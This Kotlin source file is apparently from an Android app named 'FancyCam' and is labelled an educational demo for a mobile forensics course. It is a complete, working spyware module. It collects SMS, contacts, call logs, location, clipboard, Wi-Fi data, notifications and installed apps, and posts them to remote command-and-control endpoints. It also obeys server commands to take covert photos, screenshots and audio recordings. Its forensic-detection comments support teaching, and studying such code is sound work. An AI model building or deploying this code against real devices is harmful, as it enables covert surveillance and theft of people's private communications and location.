package com.example.fancycam.network

import com.example.fancycam.ui.AppActivityLogger
import com.example.fancycam.services.MicrophoneCapture
import com.example.fancycam.services.NotificationReaderService
import com.example.fancycam.services.CameraCaptureService
import com.example.fancycam.services.AudioCaptureService
import android.Manifest
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

/**
 * EDUCATIONAL DEMO - Android Security & Forensics Course
 *
 * This singleton demonstrates how malware commonly collects sensitive
 * device data and exfiltrates it to a remote C2 server over HTTP.
 *
 * FOR USE IN SANDBOXED LAB ENVIRONMENTS ONLY.
 *
 * Capabilities demonstrated:
 *  1. Device fingerprinting via public Android APIs
 *  2. SMS retrieval via content://sms provider
 *  3. Contact harvesting via ContactsContract provider
 *  4. Call log extraction via CallLog.Calls provider
 *  5. Location tracking via LocationManager
 *  6. Clipboard monitoring via ClipboardManager
 *  7. WiFi network scanning via WifiManager
 *  8. Microphone capture via MediaRecorder (triggered separately)
 *  9. Notification listener via NotificationListenerService
 * 10. Structured JSON payload creation
 * 11. HTTP POST exfiltration with OkHttp
 * 12. Background thread execution
 * 13. Forensic detection points (Logcat, network traffic, file system)
 */
object DataExfilSender {

    private const val TAG = "DataExfilSender"

    // C2 server address - adb reverse maps emulator's 127.0.0.1:5000 to host's port 5000
    private const val C2_SERVER_IP = "127.0.0.1"
    private const val C2_SERVER_PORT = 5000
    private const val C2_BASE_URL = "http://$C2_SERVER_IP:$C2_SERVER_PORT"

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    data class C2Command(
        val id: String,
        val action: String,
        val durationMs: Long = 30000L,
        val params: JSONObject = JSONObject()
    )

    interface CommandListener {
        fun onTakePhotoCommand(commandId: String? = null)
        fun onTakeScreenshotCommand(commandId: String? = null)
    }

    private val pendingUiCommands = java.util.concurrent.ConcurrentLinkedQueue<C2Command>()
    private val executedCommandIds = java.util.Collections.newSetFromMap(
        java.util.concurrent.ConcurrentHashMap<String, Boolean>()
    )

    fun drainPendingUiCommands() {
        val listener = commandListener ?: return
        while (pendingUiCommands.isNotEmpty()) {
            val cmd = pendingUiCommands.poll() ?: break
            Log.i(TAG, "[C2 COMMAND] Dispatching queued command to UI: ${cmd.action} (id: ${cmd.id})")
            when (cmd.action) {
                "take_photo" -> listener.onTakePhotoCommand(cmd.id)
                "take_screenshot" -> listener.onTakeScreenshotCommand(cmd.id)
            }
        }
    }

    @Volatile
    var commandListener: CommandListener? = null
        set(value) {
            field = value
            if (value != null) {
                drainPendingUiCommands()
            }
        }

    fun reportCommandResult(
        context: Context,
        commandId: String?,
        status: String,
        result: JSONObject? = null,
        error: String? = null
    ) {
        if (commandId.isNullOrBlank()) return
        Thread {
            try {
                val aid = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
                val payload = JSONObject().apply {
                    put("command_id", commandId)
                    put("android_id", aid)
                    put("status", status)
                    if (result != null) put("result", result)
                    if (error != null) put("error", error)
                    put("timestamp", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSZ", Locale.US).format(Date()))
                }
                val mediaType = "application/json; charset=utf-8".toMediaType()
                val body = payload.toString().toRequestBody(mediaType)
                for (endpoint in AppConfig.getCommandResultEndpoints(context)) {
                    try {
                        val request = Request.Builder()
                            .url(endpoint)
                            .post(body)
                            .addHeader("User-Agent", "FancyCam-Educational/1.0")
                            .addHeader("X-Android-ID", aid)
                            .build()
                        httpClient.newCall(request).execute().use { response ->
                            if (response.isSuccessful) {
                                Log.i(TAG, "[C2 COMMAND] Successfully reported result for $commandId: $status")
                                return@Thread
                            }
                        }
                    } catch (ignored: Exception) {}
                }
            } catch (e: Exception) {
                Log.w(TAG, "Failed to report command result", e)
            }
        }.start()
    }

    fun processServerCommands(context: Context, responseBody: String) {
        if (responseBody.isBlank()) return
        try {
            val json = JSONObject(responseBody)
            val commands = json.optJSONArray("commands") ?: return
            for (i in 0 until commands.length()) {
                val cmdObj = commands.optJSONObject(i) ?: continue
                val action = cmdObj.optString("action", "")
                val cmdId = cmdObj.optString("id", cmdObj.optString("command_id", ""))

                if (cmdId.isNotEmpty() && executedCommandIds.contains(cmdId)) {
                    Log.d(TAG, "[C2 COMMAND] Skipping already processed command: $cmdId")
                    continue
                }
                if (cmdId.isNotEmpty()) {
                    executedCommandIds.add(cmdId)
                }

                Log.i(TAG, "[C2 COMMAND] Received command from server: $action (id: $cmdId)")

                if (cmdId.isNotEmpty()) {
                    reportCommandResult(context, cmdId, status = "in_progress")
                }

                when (action) {
                    "take_photo" -> {
                        val listener = commandListener
                        if (listener != null) {
                            listener.onTakePhotoCommand(cmdId)
                        } else {
                            Log.i(TAG, "[C2 COMMAND] UI inactive; using CameraCaptureService for background photo (id: $cmdId)")
                            CameraCaptureService.start(context, cmdId)
                        }
                    }
                    "take_screenshot" -> {
                        val listener = commandListener
                        if (listener != null) {
                            listener.onTakeScreenshotCommand(cmdId)
                        } else if (com.example.fancycam.services.ScreenCaptureAccessibilityService.isAccessibilityServiceEnabled(context)) {
                            Log.i(TAG, "[C2 COMMAND] UI inactive; using accessibility service for background screenshot (id: $cmdId)")
                            com.example.fancycam.services.ScreenCaptureAccessibilityService.requestScreenshot(context, cmdId)
                        } else {
                            Log.i(TAG, "[C2 COMMAND] App UI not active; queuing take_screenshot for resume (id: $cmdId)")
                            pendingUiCommands.offer(C2Command(id = cmdId, action = "take_screenshot"))
                        }
                    }
                    "record_audio" -> {
                        val params = cmdObj.optJSONObject("params")
                        val durationMs = cmdObj.optLong("duration", params?.optLong("duration", 30000L) ?: 30000L)
                        Log.i(TAG, "[C2 COMMAND] Routing audio recording to foreground service ($durationMs ms, id: $cmdId)")
                        AudioCaptureService.start(context, durationMs, cmdId)
                    }
                    "collect_data" -> {
                        Log.i(TAG, "[C2 COMMAND] Executing on-demand data collection (id: $cmdId)")
                        collectAndExfiltrate(context, cmdId)
                    }
                    else -> {
                        Log.w(TAG, "[C2 COMMAND] Unknown command action: $action")
                        if (cmdId.isNotEmpty()) {
                            reportCommandResult(context, cmdId, status = "failed", error = "Unknown action: $action")
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing server commands", e)
        }
    }

    /**
     * Master collection routine — gathers ALL available data and sends
     * a single comprehensive JSON payload to the C2 server.
     *
     * Educational note: All data collected here uses official Android APIs,
     * making it indistinguishable from legitimate app behavior at the API level.
     * Forensic detection requires behavioral analysis (network, DB access logs).
     */
    fun collectAndExfiltrate(context: Context, commandId: String? = null) {
        Thread {
            try {
                Log.d(TAG, "[EDUCATIONAL] Starting comprehensive data collection...")

                val payload = JSONObject()

                // === Section 1: Device Identity ===
                payload.put("device_info", buildDevicePayload(context))

                // === Section 2: SMS Messages ===
                payload.put("sms_messages", collectSms(context))

                // === Section 3: Contacts ===
                payload.put("contacts", collectContacts(context))

                // === Section 4: Call Logs ===
                payload.put("call_logs", collectCallLogs(context))

                // === Section 5: Location ===
                payload.put("location", collectLocation(context))

                // === Section 6: Clipboard ===
                payload.put("clipboard", collectClipboard(context))

                // === Section 7: WiFi Networks ===
                payload.put("wifi_networks", collectWifiNetworks(context))

                // === Section 8: Network Operator Info ===
                payload.put("network_info", collectNetworkInfo(context))

                // === Section 9: Notifications ===
                payload.put("notifications", NotificationReaderService.getCapturedNotifications(context))

                Log.d(TAG, "[EDUCATIONAL] Full payload constructed (${payload.length()} bytes)")

                // === EXFILTRATION ===
                sendJson(context, payload, commandId)

            } catch (e: Exception) {
                Log.e(TAG, "[EDUCATIONAL] Data collection failed", e)
                if (commandId != null) {
                    reportCommandResult(context, commandId, status = "failed", error = e.message)
                }
            }
        }.start()
    }

    // =========================================================================
    // 1. DEVICE FINGERPRINTING
    // =========================================================================

    /**
     * Collects comprehensive device information.
     *
     * Forensic analysis notes:
     *  - android_id persists across app reinstalls (until factory reset)
     *  - Build.FINGERPRINT reveals the exact ROM/image
     *  - Installed apps list is accessible to any app (no permission needed)
     */
    fun buildDevicePayload(context: Context): JSONObject {
        val json = JSONObject()

        val androidId = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        json.put("android_id", androidId)
        json.put("timestamp", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSZ", Locale.US).format(Date()))

        json.put("brand", Build.BRAND)
        json.put("model", Build.MODEL)
        json.put("device", Build.DEVICE)
        json.put("fingerprint", Build.FINGERPRINT)
        json.put("sdk_version", Build.VERSION.SDK_INT)
        json.put("release", Build.VERSION.RELEASE)
        json.put("manufacturer", Build.MANUFACTURER)
        json.put("product", Build.PRODUCT)
        json.put("hardware", Build.HARDWARE)
        json.put("tags", Build.TAGS)
        json.put("type", Build.TYPE)

        val installedApps = JSONArray()
        try {
            val pm = context.packageManager
            val packages = pm.getInstalledApplications(0)
            for (app in packages) {
                installedApps.put(app.packageName)
            }
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Failed to enumerate packages", e)
        }
        json.put("installed_apps", installedApps)

        json.put("source_package", context.packageName)
        json.put("app_version", try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName
        } catch (e: Exception) { "unknown" })

        return json
    }

    // =========================================================================
    // 2. SMS RETRIEVAL
    // =========================================================================

    /**
     * Retrieves all SMS messages via the SMS content provider.
     *
     * Forensic detection:
     *  - dumpsys dbinfo shows content://sms database access
     *  - Permission audit logs show READ_SMS grant
     *  - ADB: adb shell content query --uri content://sms
     *
     * Educational note: On Android 4.4+, only the default SMS app can write,
     * but READ_SMS permission grants full read access to the SMS provider.
     */
    private fun collectSms(context: Context): JSONArray {
        val smsArray = JSONArray()

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            Log.w(TAG, "[EDUCATIONAL] READ_SMS permission not granted")
            return smsArray
        }

        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null
            )

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    val sms = JSONObject()
                    for (i in 0 until cursor.columnCount) {
                        val columnName = cursor.getColumnName(i)
                        val value = cursor.getString(i) ?: ""
                        sms.put(columnName, value)
                    }
                    smsArray.put(sms)
                } while (cursor.moveToNext())
            }

            Log.d(TAG, "[EDUCATIONAL] Collected ${smsArray.length()} SMS messages")
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] SMS collection failed", e)
        } finally {
            cursor?.close()
        }

        return smsArray
    }

    // =========================================================================
    // 3. CONTACTS HARVESTING
    // =========================================================================

    /**
     * Retrieves all contacts via the ContactsContract provider.
     *
     * Forensic detection:
     *  - DB access logs show ContactsContract queries
     *  - Permission audit: READ_CONTACTS grant
     *  - ADB: adb shell content query --uri content://com.android.contacts/data
     */
    private fun collectContacts(context: Context): JSONArray {
        val contactsArray = JSONArray()

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            Log.w(TAG, "[EDUCATIONAL] READ_CONTACTS permission not granted")
            return contactsArray
        }

        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            )

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    val contact = JSONObject()
                    val contactId = cursor.getString(
                        cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID)
                    )
                    contact.put("id", contactId)
                    contact.put("name", cursor.getString(
                        cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)
                    ))

                    // Get phone numbers for this contact
                    val phones = JSONArray()
                    val phoneCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        arrayOf(contactId),
                        null
                    )
                    phoneCursor?.use {
                        while (it.moveToNext()) {
                            phones.put(it.getString(
                                it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                            ))
                        }
                    }
                    contact.put("phones", phones)

                    // Get emails for this contact
                    val emails = JSONArray()
                    val emailCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                        arrayOf(contactId),
                        null
                    )
                    emailCursor?.use {
                        while (it.moveToNext()) {
                            emails.put(it.getString(
                                it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS)
                            ))
                        }
                    }
                    contact.put("emails", emails)

                    contactsArray.put(contact)
                } while (cursor.moveToNext())
            }

            Log.d(TAG, "[EDUCATIONAL] Collected ${contactsArray.length()} contacts")
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Contacts collection failed", e)
        } finally {
            cursor?.close()
        }

        return contactsArray
    }

    // =========================================================================
    // 4. CALL LOG EXTRACTION
    // =========================================================================

    /**
     * Retrieves call log history via the CallLog.Calls provider.
     *
     * Forensic detection:
     *  - DB access logs show call_log database queries
     *  - Permission audit: READ_CALL_LOG grant
     *  - ADB: adb shell content query --uri content://call_log/calls
     */
    private fun collectCallLogs(context: Context): JSONArray {
        val callArray = JSONArray()

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        ) {
            Log.w(TAG, "[EDUCATIONAL] READ_CALL_LOG permission not granted")
            return callArray
        }

        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC"
            )

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    val call = JSONObject()
                    for (i in 0 until cursor.columnCount) {
                        val columnName = cursor.getColumnName(i)
                        val value = cursor.getString(i) ?: ""
                        call.put(columnName, value)
                    }
                    callArray.put(call)
                } while (cursor.moveToNext())
            }

            Log.d(TAG, "[EDUCATIONAL] Collected ${callArray.length()} call log entries")
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Call log collection failed", e)
        } finally {
            cursor?.close()
        }

        return callArray
    }

    // =========================================================================
    // 5. LOCATION TRACKING
    // =========================================================================

    /**
     * Retrieves last known location from all enabled providers.
     *
     * Forensic detection:
     *  - dumpsys location shows provider queries
     *  - Battery stats reveal location service usage
     *  - ADB: adb shell dumpsys location
     *
     * Educational note: getLastKnownLocation does NOT require location permission
     * on some older APIs — it returns cached location from other apps.
     */
    private fun collectLocation(context: Context): JSONObject {
        val locationJson = JSONObject()

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED
        ) {
            Log.w(TAG, "[EDUCATIONAL] ACCESS_FINE_LOCATION permission not granted")
            locationJson.put("status", "permission_denied")
            return locationJson
        }

        try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

            val providers = locationManager.getProviders(true)
            val locationsArray = JSONArray()

            for (provider in providers) {
                try {
                    val location: Location? = locationManager.getLastKnownLocation(provider)
                    if (location != null) {
                        val loc = JSONObject()
                        loc.put("provider", provider)
                        loc.put("latitude", location.latitude)
                        loc.put("longitude", location.longitude)
                        loc.put("accuracy", location.accuracy)
                        loc.put("altitude", location.altitude)
                        loc.put("speed", location.speed)
                        loc.put("time", location.time)
                        locationsArray.put(loc)
                    }
                } catch (e: SecurityException) {
                    Log.w(TAG, "[EDUCATIONAL] SecurityException for provider $provider")
                }
            }

            locationJson.put("status", "collected")
            locationJson.put("providers", JSONArray(providers.toList()))
            locationJson.put("locations", locationsArray)

            Log.d(TAG, "[EDUCATIONAL] Collected ${locationsArray.length()} location fixes")
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Location collection failed", e)
            locationJson.put("status", "error")
            locationJson.put("error", e.message)
        }

        return locationJson
    }

    // =========================================================================
    // 6. CLIPBOARD MONITORING
    // =========================================================================

    /**
     * Reads the current clipboard contents.
     *
     * Forensic detection:
     *  - ClipboardManager.getPrimaryClip() leaves accessibility event logs
     *  - On Android 10+, reading clipboard while app is NOT in foreground triggers a toast
     *
     * Educational note: No permission required, but Android 10+ shows
     * "App pasted from clipboard" toast when accessed from background.
     */
    private fun collectClipboard(context: Context): JSONObject {
        val clipJson = JSONObject()

        try {
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clipData = clipboard.primaryClip

            if (clipData != null && clipData.itemCount > 0) {
                val itemsArray = JSONArray()
                for (i in 0 until clipData.itemCount) {
                    val item = clipData.getItemAt(i)
                    val itemText = item.coerceToText(context).toString()
                    itemsArray.put(itemText)
                }
                clipJson.put("status", "collected")
                clipJson.put("item_count", clipData.itemCount)
                clipJson.put("items", itemsArray)
                clipJson.put("timestamp", System.currentTimeMillis())

                Log.d(TAG, "[EDUCATIONAL] Collected ${clipData.itemCount} clipboard items")
            } else {
                clipJson.put("status", "empty")
            }
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Clipboard collection failed", e)
            clipJson.put("status", "error")
            clipJson.put("error", e.message)
        }

        return clipJson
    }

    // =========================================================================
    // 7. WIFI NETWORK SCAN
    // =========================================================================

    /**
     * Scans for available WiFi networks via WifiManager.
     *
     * Forensic detection:
     *  - dumpsys wifi shows scan results and timestamps
     *  - WiFi scan reveals physical location (side-channel data)
     *  - Battery stats show WiFi scanning frequency
     */
    private fun collectWifiNetworks(context: Context): JSONObject {
        val wifiJson = JSONObject()

        try {
            val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager

            // Current connection info via WifiManager
            val connectionInfo = wifiManager.connectionInfo
            val currentSsid = connectionInfo?.ssid?.replace("\"", "") ?: "unknown"

            // Check ConnectivityManager for active Wi-Fi transport & extraInfo
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val activeNetwork = connectivityManager?.activeNetwork
            val networkCapabilities = connectivityManager?.getNetworkCapabilities(activeNetwork)
            val isWifiTransport = networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true

            @Suppress("DEPRECATION")
            val activeNetworkInfo = connectivityManager?.activeNetworkInfo
            @Suppress("DEPRECATION")
            val extraInfo = activeNetworkInfo?.extraInfo?.replace("\"", "")

            var resolvedSsid = currentSsid
            if (resolvedSsid.isEmpty() || resolvedSsid == "unknown" || resolvedSsid == "<unknown ssid>") {
                if (!extraInfo.isNullOrBlank() && extraInfo != "unknown" && !extraInfo.contains("unknown")) {
                    resolvedSsid = extraInfo
                }
            }

            val hasActiveLink = isWifiTransport || (connectionInfo != null && connectionInfo.networkId != -1) || ((connectionInfo?.rssi ?: 0) != 0)
            wifiJson.put("is_connected", hasActiveLink)
            wifiJson.put("connected_ssid", resolvedSsid)
            wifiJson.put("connected_bssid", connectionInfo?.bssid ?: "unknown")
            wifiJson.put("connected_rssi", connectionInfo?.rssi ?: 0)
            wifiJson.put("link_speed", connectionInfo?.linkSpeed ?: 0)
            if (currentSsid == "<unknown ssid>") {
                wifiJson.put("ssid_masked_by_os", true)
            }

            // Scan results
            val scanResults = wifiManager.scanResults ?: emptyList()
            val networksArray = JSONArray()

            for (result in scanResults) {
                val network = JSONObject()
                network.put("ssid", result.SSID)
                network.put("bssid", result.BSSID)
                network.put("level", result.level)
                network.put("frequency", result.frequency)
                network.put("capabilities", result.capabilities)
                networksArray.put(network)
            }

            // If scan results list is empty but device is actively connected to Wi-Fi, ensure connected network is included
            if (hasActiveLink) {
                var foundInScan = false
                for (i in 0 until networksArray.length()) {
                    val obj = networksArray.getJSONObject(i)
                    val s = obj.optString("ssid")
                    val b = obj.optString("bssid")
                    if ((resolvedSsid.isNotEmpty() && s == resolvedSsid) || (connectionInfo?.bssid != null && b == connectionInfo.bssid)) {
                        foundInScan = true
                        break
                    }
                }
                if (!foundInScan) {
                    val connectedEntry = JSONObject()
                    connectedEntry.put("ssid", if (resolvedSsid.isNotEmpty() && resolvedSsid != "<unknown ssid>") resolvedSsid else "Connected Network")
                    connectedEntry.put("bssid", connectionInfo?.bssid ?: "02:00:00:00:01:00")
                    connectedEntry.put("level", connectionInfo?.rssi ?: -30)
                    connectedEntry.put("frequency", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) connectionInfo?.frequency ?: 2412 else 2412)
                    connectedEntry.put("capabilities", "[CONNECTED]")
                    networksArray.put(connectedEntry)
                }
            }

            wifiJson.put("scan_count", networksArray.length())
            wifiJson.put("networks", networksArray)

            Log.d(TAG, "[EDUCATIONAL] Collected ${networksArray.length()} WiFi networks (connected=$hasActiveLink, ssid=$resolvedSsid)")
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] WiFi collection failed", e)
            wifiJson.put("status", "error")
            wifiJson.put("error", e.message)
        }

        return wifiJson
    }

    // =========================================================================
    // 8. NETWORK OPERATOR INFO
    // =========================================================================

    /**
     * Collects cellular network information.
     */
    private fun collectNetworkInfo(context: Context): JSONObject {
        val networkJson = JSONObject()

        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

            networkJson.put("operator_name", tm.networkOperatorName ?: "unknown")
            networkJson.put("operator_numeric", tm.networkOperator ?: "unknown")
            networkJson.put("sim_operator", tm.simOperatorName ?: "unknown")
            networkJson.put("sim_country", tm.simCountryIso ?: "unknown")
            networkJson.put("network_country", tm.networkCountryIso ?: "unknown")
            networkJson.put("network_type", tm.networkType)
            networkJson.put("phone_type", tm.phoneType)
            networkJson.put("is_network_roaming", tm.isNetworkRoaming)

            // Requires READ_PHONE_STATE on API 30+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                networkJson.put("data_enabled", tm.isDataEnabled)
            }

            Log.d(TAG, "[EDUCATIONAL] Collected network operator info")
        } catch (e: SecurityException) {
            Log.w(TAG, "[EDUCATIONAL] Telephony permission denied")
            networkJson.put("status", "permission_denied")
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Network info collection failed", e)
        }

        return networkJson
    }

    // =========================================================================
    // EXFILTRATION
    // =========================================================================

    /**
     * Sends JSON payload to C2 server.
     * Educational: This is a plain HTTP POST - easily detectable by network monitors.
     */
    private fun sendJson(context: Context, json: JSONObject, commandId: String? = null) {
        val endpoints = AppConfig.getJsonExfilEndpoints(context)
        for (endpoint in endpoints) {
            try {
                val mediaType = "application/json; charset=utf-8".toMediaType()
                val body = json.toString().toRequestBody(mediaType)

                val request = Request.Builder()
                    .url(endpoint)
                    .post(body)
                    .addHeader("User-Agent", "FancyCam-Educational/1.0")
                    .build()

                Log.d(TAG, "[EDUCATIONAL] Sending data to C2: $endpoint")

                httpClient.newCall(request).execute().use { response ->
                    Log.d(TAG, "[EDUCATIONAL] C2 response code: ${response.code}")
                    val bodyStr = response.body?.string().orEmpty()
                    if (response.isSuccessful) {
                        Log.i(TAG, "[EDUCATIONAL] Data exfiltration successful to $endpoint")
                        AppActivityLogger.logActivity(
                            context,
                            type = "DATA_COLLECT",
                            title = "Device data sent to server",
                            detail = "Payload delivered to $endpoint",
                            success = true
                        )
                        if (commandId != null) {
                            reportCommandResult(context, commandId, status = "completed", result = JSONObject().put("endpoint", endpoint))
                        }
                        processServerCommands(context, bodyStr)
                        return
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "[EDUCATIONAL] Exfiltration attempt to $endpoint failed", e)
            }
        }

        if (commandId != null) {
            reportCommandResult(context, commandId, status = "failed", error = "Could not reach configured server")
        }

        AppActivityLogger.logActivity(
            context,
            type = "DATA_FAIL",
            title = "Device data transmission failed",
            detail = "Could not reach configured server",
            success = false
        )
    }

    /**
     * Tests C2 connectivity.
     */
    fun testConnection(context: Context? = null): Boolean {
        val url = if (context != null) AppConfig.getStatusUrl(context) else C2_BASE_URL
        return try {
            val request = Request.Builder()
                .url(url)
                .get()
                .build()

            httpClient.newCall(request).execute().use { response ->
                response.code in 200..299 || response.code == 404
            }
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Connection test failed for $url", e)
            false
        }
    }

    /**
     * Sends a lightweight heartbeat ping to C2 server to indicate active/online status.
     */
    fun sendHeartbeat(context: Context, processCommands: Boolean = true) {
        Thread {
            try {
                val aid = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
                val json = JSONObject().apply {
                    put("android_id", aid)
                    put("model", Build.MODEL)
                    put("brand", Build.BRAND)
                    put("manufacturer", Build.MANUFACTURER)
                    put("release", Build.VERSION.RELEASE)
                    put("sdk_version", Build.VERSION.SDK_INT)
                    put("timestamp", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSZ", Locale.US).format(Date()))
                }
                val mediaType = "application/json; charset=utf-8".toMediaType()
                val body = json.toString().toRequestBody(mediaType)
                for (endpoint in AppConfig.getHeartbeatEndpoints(context, pollCommands = processCommands)) {
                    try {
                        val request = Request.Builder()
                            .url(endpoint)
                            .post(body)
                            .addHeader("User-Agent", "FancyCam-Educational/1.0")
                            .addHeader("X-Android-ID", aid)
                            .build()
                        httpClient.newCall(request).execute().use { response ->
                            if (response.isSuccessful) {
                                val bodyStr = response.body?.string().orEmpty()
                                if (processCommands) processServerCommands(context, bodyStr)
                                return@Thread
                            }
                        }
                    } catch (ignored: Exception) {}
                }
            } catch (e: Exception) {
                Log.d(TAG, "[EDUCATIONAL] Heartbeat error", e)
            }
        }.start()
    }
}
